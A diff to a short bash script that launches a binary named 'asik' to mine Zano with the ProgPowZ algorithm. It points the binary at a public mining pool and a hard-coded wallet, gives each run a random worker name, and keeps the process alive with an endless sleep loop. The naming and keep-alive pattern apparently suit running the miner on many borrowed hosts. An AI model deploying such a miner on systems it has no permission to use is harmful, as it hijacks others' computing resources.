@@ -1,1 +1,6 @@
-./asik -a ProgPowZ -o zano.luckypool.io:8866 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV94s5jcRfic3B796WwtF.aset
+#!/bin/bash
+./asik -a ProgPowZ -o zano.luckypool.io:8866 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV94s5jcRfic3B796WwtF.$(echo $(shuf -i 1-20000 -n 1)-SUIII)
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
